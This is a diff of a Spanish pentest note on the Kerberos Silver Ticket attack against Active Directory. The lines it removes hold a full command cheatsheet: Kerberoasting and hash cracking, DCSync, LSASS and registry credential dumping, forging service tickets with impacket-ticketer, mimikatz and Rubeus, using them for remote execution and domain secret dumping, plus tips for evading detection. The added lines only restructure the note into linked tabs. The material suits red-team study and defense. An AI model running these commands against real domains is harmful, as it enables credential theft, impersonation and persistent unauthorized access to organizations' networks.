@@ -3,11 +3,12 @@ aliases:
   - Silver Ticket Attack
   - Forged TGS
 tags:
-  - type/atomic
+  - type/hub
   - technique/persistence
   - technique/lateral-movement
   - technique/kerberos
   - env/windows
+  - env/linux
   - asset/active-directory
   - cred/kerberos
 primary categories:
@@ -16,7 +17,7 @@ secondary categories:
   - "[[Post-Explotación]]"
 tertiary categories:
   - "[[Active Directory]]"
-type: Atomic
+type: Hub
 linked:
   - "[[Active Directory Explotación 1]]"
   - "[[Golden Ticket]]"
@@ -25,195 +26,153 @@ linked:
   - "[[Rubeus]]"
   - "[[Impacket Toolkit]]"
   - "[[Mimikatz Cheatsheet]]"
+  - "[[Silver Ticket - Prereqs y SPNs]]"
+  - "[[Silver Ticket - Hash Collection]]"
+  - "[[Silver Ticket - Forging Linux]]"
+  - "[[Silver Ticket - Forging Windows]]"
+  - "[[Silver Ticket - Detection y Mitigations]]"
+  - "[[Silver Ticket - Tooling]]"
 ---
+
 # Silver Ticket
 
-***
+Con NT hash (o AES key) de **service/computer account** se forja un TGS arbitrario para un servicio específico. Target valida con su propia key — **no pasa por el DC**. Menor scope que [[Golden Ticket]] pero menos ruido (sin 4768/4769 en DC).
 
-## Cheatsheet
-^silver-ticket
-
-| Paso | Comando |
-| --- | --- |
-| **Obtener hash de service account** | Kerberoast crack / DCSync / LSASS dump |
-| **Forjar TGS (impacket)** | `impacket-ticketer -nthash SVC_HASH -domain-sid SID -domain dom.local -spn cifs/host.dom.local administrator` |
-| **Forjar TGS (mimikatz)** | `kerberos::golden /user:admin /domain:dom.local /sid:SID /target:host.dom.local /service:cifs /rc4:HASH /ptt` |
-| **Forjar TGS (Rubeus)** | `Rubeus.exe silver /service:cifs/host.dom.local /rc4:HASH /ldap /user:admin /ptt` |
-| **Usar (Linux)** | `export KRB5CCNAME=tkt.ccache; impacket-psexec -k -no-pass host.dom.local` |
+**Requiere**: hash del service/computer account + Domain SID + SPN del servicio + FQDN target.
 
 ***
 
-## Concepto
+## Prereqs y SPNs
 
-Con el NT hash (o AES key) de **cualquier service account** (o computer account) se puede forjar un TGS (Ticket-Granting Service) arbitrario para un servicio específico de ese target.
+````tabs
+tab: **Domain SID**
+![[Silver Ticket - Prereqs y SPNs#^st-pre-sid]]
 
-A diferencia de Golden: no pasa por el DC — el target service valida el TGS con su propia key. Si la key es correcta, el ticket es aceptado sin consultar al DC.
+tab: **SPN discovery**
+![[Silver Ticket - Prereqs y SPNs#^st-pre-spns]]
 
-**Menor alcance que Golden** (solo el servicio targeted) pero **menor ruido** (no genera 4768/4769 en DC).
+tab: **FQDN target**
+![[Silver Ticket - Prereqs y SPNs#^st-pre-fqdn]]
 
-## Requisitos
+tab: **Test hash**
+![[Silver Ticket - Prereqs y SPNs#^st-pre-test]]
 
-- NT hash o AES key del service/computer account target.
-- Domain SID.
-- SPN del servicio (`cifs/host`, `mssql/host:1433`, `http/host`, `ldap/host`).
-- Conectividad al servicio (no al DC).
+tab: **Verify SPN existe**
+![[Silver Ticket - Prereqs y SPNs#^st-pre-verify]]
 
-## SPN por servicio
+tab: **OPSEC pre-attack**
+![[Silver Ticket - Prereqs y SPNs#^st-pre-opsec]]
+````
 
-| Servicio | SPN |
-| --- | --- |
-| **SMB / File share** | `cifs/host.dom.local` |
-| **MSSQL** | `mssqlsvc/host.dom.local:1433` |
-| **HTTP / WinRM / IIS** | `http/host.dom.local` |
-| **LDAP / DCSync (requiere DC$)** | `ldap/dc.dom.local` |
-| **RPC / DCOM** | `host/host.dom.local` |
-| **Scheduled Tasks** | `host/host.dom.local` |
-| **WMI** | `host/host.dom.local`, `rpcss/host.dom.local` |
+___
 
-Host service = computer account: `cifs/HOST`, `host/HOST`, `ldap/HOST` (DCs only).
+## Hash Collection
 
-## 1. Obtener hash del service account
+````tabs
+tab: **Kerberoast → crack**
+![[Silver Ticket - Hash Collection#^st-hash-kerberoast]]
 
-### Kerberoasting (cuenta user con SPN)
-```bash
-impacket-GetUserSPNs dom.local/user:pass -request -outputfile tgs.txt
-hashcat -m 13100 tgs.txt rockyou.txt
-# → password → NTLM hash
-```
+tab: **DCSync (computer/service)**
+![[Silver Ticket - Hash Collection#^st-hash-dcsync]]
 
-### DCSync (computer account)
-```bash
-impacket-secretsdump dom.local/da:pass@DC -just-dc-user 'TARGET$'
-# TARGET$:computerRID:LM:NTHASH:::
-```
+tab: **LSASS dump**
+![[Silver Ticket - Hash Collection#^st-hash-lsass]]
 
-### LSASS (con sesión admin en target)
-```powershell
-mimikatz # sekurlsa::msv
-# Buscar TARGET$ o service account
-```
+tab: **LSA Secrets**
+![[Silver Ticket - Hash Collection#^st-hash-lsa]]
 
-### Local dump del host target
-```powershell
-# Con admin local
-reg save HKLM\SYSTEM SYSTEM
-reg save HKLM\SECURITY SECURITY
-impacket-secretsdump LOCAL -security SECURITY -system SYSTEM
-# Computer account hash en LSA secrets
-```
+tab: **Verify hash**
+![[Silver Ticket - Hash Collection#^st-hash-verify]]
+````
 
-## 2. Forjar TGS (impacket-ticketer)
+___
 
-```bash
-impacket-ticketer \
-  -nthash COMPUTERHASH \
-  -domain-sid S-1-5-21-... \
-  -domain dom.local \
-  -spn cifs/target.dom.local \
-  administrator
-# → administrator.ccache
-```
+## Forging Linux
 
-Con AES (preferible):
-```bash
-impacket-ticketer \
-  -aesKey AES256_KEY \
-  -domain-sid SID \
-  -domain dom.local \
-  -spn cifs/target.dom.local \
-  administrator
-```
+````tabs
+tab: **RC4 básico**
+![[Silver Ticket - Forging Linux#^st-forge-linux-rc4]]
 
-Para DCSync via silver (requiere hash de DC$):
-```bash
-impacket-ticketer -nthash DC_HASH -domain-sid SID -domain dom.local -spn ldap/dc.dom.local administrator
-export KRB5CCNAME=administrator.ccache
-impacket-secretsdump -k -no-pass dom.local/administrator@dc.dom.local -just-dc
-```
+tab: **AES256 OPSEC**
+![[Silver Ticket - Forging Linux#^st-forge-linux-aes]]
 
-## 3. Forjar TGS (mimikatz)
+tab: **Flags avanzados**
+![[Silver Ticket - Forging Linux#^st-forge-linux-flags]]
 
-```
-mimikatz # kerberos::golden /user:Administrator /domain:dom.local /sid:S-1-5-21-... /target:target.dom.local /service:cifs /rc4:HASH /id:500 /ptt
-```
+tab: **DCSync via silver (LDAP)**
+![[Silver Ticket - Forging Linux#^st-forge-linux-dcsync]]
 
-## 4. Forjar TGS (Rubeus)
+tab: **Verify y usar**
+![[Silver Ticket - Forging Linux#^st-forge-linux-verify]]
+````
 
-```powershell
-# RC4
-.\Rubeus.exe silver /service:cifs/target.dom.local /rc4:HASH /ldap /user:admin /ptt
+___
 
-# AES256 (recomendado)
-.\Rubeus.exe silver /service:cifs/target.dom.local /aes256:KEY /ldap /user:admin /ptt
+## Forging Windows
 
-# Sin /ldap (PAC manual)
-.\Rubeus.exe silver /service:cifs/target.dom.local /rc4:HASH /user:admin /id:500 /groups:512,513,518,519,520 /sid:SID /domain:dom.local /ptt
-```
+````tabs
+tab: **Rubeus RC4**
+![[Silver Ticket - Forging Windows#^st-forge-win-rc4]]
 
-`/ldap` consulta AD para PAC real del user → más realista.
+tab: **Rubeus AES256**
+![[Silver Ticket - Forging Windows#^st-forge-win-aes]]
 
-## 5. Multi-SPN tickets
+tab: **Rubeus flags avanzados**
+![[Silver Ticket - Forging Windows#^st-forge-win-flags]]
 
-Para operaciones que usan múltiples SPNs sobre el mismo host:
+tab: **mimikatz**
+![[Silver Ticket - Forging Windows#^st-forge-win-mimi]]
 
-```powershell
-# WMI típicamente requiere: host/ + rpcss/
-.\Rubeus.exe silver /service:host/target.dom.local,rpcss/target.dom.local /rc4:HASH /user:admin /ptt
-```
+tab: **DCSync via silver (LDAP)**
+![[Silver Ticket - Forging Windows#^st-forge-win-dcsync]]
+````
 
-## 6. Chains
+___
 
-### DCSync via Silver Ticket
-Con hash de DC$ forjar TGS para `ldap/dc.dom.local` → secretsdump sin DA.
+## Detection y Mitigations
 
-### Persistence via computer account
-Silver ticket para `cifs/` o `host/` de target → RCE persistente aun post password reset del user inicial.
+````tabs
+tab: **Events**
+![[Silver Ticket - Detection y Mitigations#^st-detect-events]]
 
-### MSSQL xp_cmdshell
-Hash de cuenta `sa` kerberoasteable → TGS `mssqlsvc/` → login Kerberos → `xp_cmdshell`.
+tab: **MDI Alerts**
+![[Silver Ticket - Detection y Mitigations#^st-detect-mdi]]
 
-## 7. OpSec
+tab: **KQL Hunt**
+![[Silver Ticket - Detection y Mitigations#^st-detect-kql]]
 
-### Ventajas
-- No toca DC → **no genera 4768** (TGT request).
-- Service validation es local → eventos 4624 en target pero sin TGS request visible en DC (4769).
-- Lifetime arbitrario.
+tab: **OPSEC Tips**
+![[Silver Ticket - Detection y Mitigations#^st-detect-opsec]]
 
-### Detecciones
-- **PAC validation**: si servicio valida PAC vs DC, TGS forjado se detecta.
-- **Event 4624** con logon type 3 + Kerberos sin 4768 previo correlacionado.
-- **Encryption mismatch**: RC4 cuando dominio usa AES.
-- **Ticket lifetime** anómalo.
+tab: **Invalidación**
+![[Silver Ticket - Detection y Mitigations#^st-detect-invalidate]]
 
-### Tips
-- Usar AES256 si dominio lo soporta.
-- User real existente con RID coherente.
-- Lifetime realista (<24h).
-- Purge tickets antes de inyectar.
+tab: **Hardening Checklist**
+![[Silver Ticket - Detection y Mitigations#^st-detect-checklist]]
+````
 
-## 8. Invalidación
+___
 
-Silver es válido hasta que:
-- Service account / computer account **rote password**.
-- Computer accounts rotan default cada 30 días (policy configurable).
+## Tooling
 
-Preferible usar hash de cuentas service con rotation lenta o manual.
+````tabs
+tab: **impacket-ticketer**
+![[Silver Ticket - Tooling#^st-tool-ticketer]]
 
-## Diferencias clave con Golden
+tab: **impacket-GetUserSPNs**
+![[Silver Ticket - Tooling#^st-tool-getuserspns]]
 
-| | Golden | Silver |
-| --- | --- | --- |
-| Key | krbtgt | Service/computer account |
-| Tipo | TGT | TGS |
-| Scope | Todo el dominio | 1 servicio en 1 host |
-| Interacción DC | Sí (TGS requests) | No (ticket usado directo) |
-| Ruido | 4768 en DC | Solo 4624 en target |
-| Persistence | Hasta doble rotación krbtgt | Hasta rotation del account |
+tab: **Rubeus**
+![[Silver Ticket - Tooling#^st-tool-rubeus]]
 
-## Recursos
+tab: **mimikatz**
+![[Silver Ticket - Tooling#^st-tool-mimi]]
 
-- [HackTricks - Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
-- [ADSecurity - Silver Tickets](https://adsecurity.org/?p=2011)
-- [Rubeus - Silver](https://github.com/GhostPack/Rubeus#silver)
+tab: **Uso post-silver**
+![[Silver Ticket - Tooling#^st-tool-uso]]
+
+tab: **Recursos**
+![[Silver Ticket - Tooling#^st-tool-resources]]
+````
 
 ***
